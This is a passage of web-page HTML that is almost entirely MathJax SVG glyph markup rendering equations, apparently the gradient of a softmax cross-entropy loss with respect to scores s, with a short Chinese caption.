690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z\"/></g></g><g data-mml-node=\"msup\" transform=\"translate(16738.5,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,413) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D458\" d=\"M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z\"/></g></g></g></g><g data-mml-node=\"mo\" transform=\"translate(17938.3,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mspace\" transform=\"translate(18327.3,0)\"/><g data-mml-node=\"mo\" transform=\"translate(18605.1,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(19660.9,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(20438.9,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(502,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(523,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g><g data-mml-node=\"mo\" transform=\"translate(21790.8,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(22791,0)\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(24069,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"mo\" transform=\"translate(24069,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"munderover\" transform=\"translate(24458,0)\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(86,-1107.7) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D458\" d=\"M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(521,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(1299,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mi\" transform=\"translate(453.3,1150) scale(0.707)\"><path data-c=\"1D436\" d=\"M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z\"/></g></g><g data-mml-node=\"msup\" transform=\"translate(26068.7,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,413) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D458\" d=\"M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z\"/></g></g></g></g><g data-mml-node=\"mo\" transform=\"translate(27268.5,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> L对s求导： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -2.893ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"46.787ex\" height=\"6.041ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1391 20679.9 2669.9\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(220,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(714,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(302.3,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g></g><rect width=\"1774\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(2291.7,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3347.5,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(4125.5,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4625.5,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(5014.5,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(523,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(6109.2,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(7165,0)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(7577,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(8188.2,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(9188.5,0)\"><g data-mml-node=\"msup\" transform=\"translate(1536.1,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,363) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-935.6)\"><g data-mml-node=\"munderover\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1089,477.1) scale(0.707)\"><path data-c=\"1D436\" d=\"M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(1089,-285.4) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D458\" d=\"M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(521,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 